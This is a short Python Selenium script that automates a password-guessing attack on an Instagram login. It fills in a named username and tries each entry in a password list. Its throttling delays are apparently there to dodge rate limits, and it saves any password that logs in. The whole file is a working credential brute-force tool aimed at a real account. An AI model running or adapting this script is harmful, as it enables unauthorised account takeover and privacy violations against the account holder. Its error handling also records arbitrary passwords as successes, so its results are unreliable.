from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import time
from webdriver_manager.chrome import ChromeDriverManager
import requests
import random

service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)
driver.get("https://www.instagram.com/")

time.sleep(15)

usinp = driver.find_element(By.NAME, 'username')

passinp = driver.find_element(By.NAME, 'password')


usinp.send_keys("selimmerzgui2")

with open("password_list.txt","r") as f:
    PASSWORDS = [i for i in f]

a = 0
for password in PASSWORDS:
    
    try:
        passinp.send_keys(Keys.CONTROL + 'a')
        passinp.send_keys(Keys.BACKSPACE)
        passinp.send_keys(password)
        if a%25 == 0:
            time.sleep(90)
        else:
            t = random.randint(5,16)
            time.sleep(t)
        passinp.submit()
        time.sleep(5)
        if "Sorry, your password was incorrect. Please double-check your password." in driver.page_source:
            a += 1
            continue
        else:
            print("SUCCESS!!!!!!! \n Password is: ", password)
            with open("scsflpass.txt", 'w') as f:
                f.write(password)
            break
    except:
        print("Password is:", password)
        with open("scsflpass.txt", 'w') as f:
            f.write(password)
